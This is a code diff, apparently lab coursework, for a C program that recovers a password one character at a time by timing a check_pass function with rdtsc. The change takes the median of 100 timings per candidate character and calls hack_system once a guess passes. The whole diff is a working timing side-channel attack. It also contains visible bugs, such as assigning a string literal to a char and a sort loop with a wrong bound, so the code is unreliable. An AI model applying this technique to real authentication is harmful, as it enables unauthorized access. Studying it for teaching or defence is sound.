@@ -52,8 +52,8 @@ int main(int argc, char **argv) {
     long timer[94];
     for (char c = 33; c<127; c++){
         guess[i] =c;
-        
-	
+    long counter[100];
+    for (int q = 0; q<100;q++){	
 	a = rdtsc();
 	check_pass(guess);	
     //if (check_pass(guess)) {
@@ -62,15 +62,28 @@ int main(int argc, char **argv) {
     //};
 	d = rdtsc();
 	f = d-a;
-	printf("%d\t",f/(i+2));
-	if(f/(i+2)>median+50&&f/(i+2)<median+100){
-	    printf(guess);
-	    printf("%d",f/(i+2));
-	    printf("\n");
-	}
-	timer[c-33] = f;
-		
+	//printf("%d\t",f/(i+2));
+	//if(f/(i+2)>median-50&&f/(i+2)<median+100){
+	//    printf(guess);
+	//    printf("%d",f/(i+2));
+	//    printf("\n");
+	//}
+	//timer[c-33] = f;
+	counter[q] = f;
     }
+    for ( int q =0; q<100-1;q++){
+        for(int w = 0;w<100-i;w++){
+	    if (counter[w]<=counter[w+1]){
+ 	        long t = counter[w];
+		counter[w] = counter[w+1];
+		counter[w+1] = t;
+	    }else
+	    continue;
+	}
+    }
+    long time=(counter[100/2]+counter[100/2+1])/2.0;
+    timer[c-33] = time;
+    }	    
     long z = 0;
     int j;
     int index;
@@ -84,9 +97,11 @@ int main(int argc, char **argv) {
         //printf("%d\t",timer[j]); 
     }
     //printf("%d\t",index);
-    //for (int i =0; i <94;i++){printf("%d %c\t",timer[i],i+33);}
+    for (int i =0; i <94;i++){printf("%d %c\t",timer[i],i+33);}
     printf("\n");
     guess[i] = index+33;
+    guess[i+1] = "\0";
+    if (check_pass(guess)==1){hack_system(guess);}
     }
     printf("Could not get the password!  Last guess was %s\n", guess);
     return 1;
